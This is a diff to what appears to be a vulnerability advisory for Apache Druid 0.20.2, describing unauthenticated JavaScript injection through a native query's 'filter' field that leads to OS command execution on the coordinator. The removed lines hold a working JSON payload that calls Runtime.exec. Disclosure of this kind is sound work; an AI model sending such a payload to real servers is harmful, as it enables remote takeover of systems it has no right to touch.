@@ -16,19 +16,7 @@ server's JavaScript engine (Rhino) with the privileges of the `druid` process.
 An attacker with network access to the coordinator (port 8081) can send a crafted
 HTTP POST request with a malicious JavaScript payload in the `filter` field of a
 native query. No authentication is required in default deployments. The payload
-is executed on the server immediately, enabling arbitrary OS command execution:
-
-```json
-{
-  "queryType": "scan",
-  "dataSource": "wikipedia",
-  "filter": {
-    "type": "javascript",
-    "dimension": "added",
-    "function": "function(value) { java.lang.Runtime.getRuntime().exec('id > /tmp/pwned'); return true; }"
-  }
-}
-```
+is executed on the server immediately, enabling arbitrary OS command execution.
 
 ## Affected Service
 - **Service:** Apache Druid 0.20.2 (coordinator)
